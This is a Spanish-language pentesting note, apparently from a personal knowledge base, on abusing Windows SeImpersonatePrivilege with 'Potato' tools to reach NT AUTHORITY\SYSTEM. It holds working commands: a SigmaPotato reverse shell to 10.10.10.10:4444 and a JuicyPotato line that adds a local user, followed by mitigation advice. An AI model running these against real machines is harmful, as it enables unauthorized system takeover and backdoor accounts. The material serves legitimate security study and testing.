---
title: Token Kidnapping (SeImpersonatePrivilege)
resumen: Abusar del privilegio de suplantación de tokens para pasar de cuenta de servicio a NT AUTHORITY\SYSTEM.
tags: potatoes
---

## Definición

`SeImpersonatePrivilege` (y su primo `SeAssignPrimaryToken`) es un privilegio de seguridad de Windows que permite a un proceso suplantar el token de otro usuario que se autentica contra él. Es un privilegio legítimo y muy habitual en cuentas de servicio (IIS, MSSQL, colas de tareas...), porque lo necesitan para atender peticiones en nombre de otros. El problema es que, si se consigue forzar a un proceso con privilegios de `SYSTEM` a autenticarse contra el atacante (típicamente abusando de DCOM/RPC), el atacante puede capturar y reutilizar ese token — pasando de una cuenta de servicio de bajo perfil a control total del equipo.

## Cuándo se usa

En cuanto se obtiene ejecución de código en un equipo Windows bajo una cuenta de servicio (muy típico tras comprometer una aplicación web sobre IIS, o una instancia de SQL Server) y se confirma, listando privilegios, que `SeImpersonatePrivilege` está activo. Es de las rutas más rápidas y fiables para llegar a `NT AUTHORITY\SYSTEM` en Windows Server 2012-2022, ya que el fallo real reside en el servicio `RPCSS`, que no tiene una corrección completa.

## Requisitos previos

- Ejecución de código en el equipo objetivo bajo una cuenta con `SeImpersonatePrivilege` (o `SeAssignPrimaryToken`) activo.
- Poder subir y ejecutar un binario (la explotación se hace con herramientas concretas, no manualmente).

## Desarrollo del ataque

1. Comprobar qué privilegios tiene la cuenta actual.

```powershell
whoami /priv
```

2. Si aparece `SeImpersonatePrivilege` (o `SeAssignPrimaryToken`) como `Enabled`, elegir la herramienta de la familia "Potato" adecuada a la versión de Windows (las más modernas, GodPotato/SigmaPotato, funcionan de Server 2012 a 2022 sin depender de un CLSID específico; JuicyPotato y churrasco son las variantes clásicas, más limitadas por versión de sistema operativo).
3. Ejecutar la herramienta indicándole un binario o comando a lanzar — se ejecutará con privilegios de `SYSTEM`.
4. Usar esa ejecución para crear un usuario administrador, lanzar una reverse shell, o directamente dumpear credenciales locales desde esa posición.

```powershell
# Confirmación rápida del privilegio abusable
whoami /priv
```

```bash
# Ejemplo con GodPotato / SigmaPotato (no dependen de CLSID por versión)
./SigmaPotato.exe --revshell 10.10.10.10 4444
```

```bash
# Ejemplo con JuicyPotato (versiones más antiguas de Windows)
JuicyPotato.exe -t * -p C:\Windows\System32\cmd.exe -a "/c net user userAdmin Password123 /add" -l 1337
```

## Herramientas relacionadas

- Ver [[potatoes]]

## Detección y mitigación

Restringir `SeImpersonatePrivilege` a las cuentas de servicio que realmente lo necesiten, ejecutar servicios de aplicación con las cuentas de menor privilegio posible (evitar `LocalSystem` cuando no haga falta), aplicar los parches disponibles para el servicio RPCSS, y monitorizar la creación de procesos con token de `SYSTEM` lanzados por cuentas de servicio de aplicación (IIS, SQL Server) que normalmente no deberían generarlos.
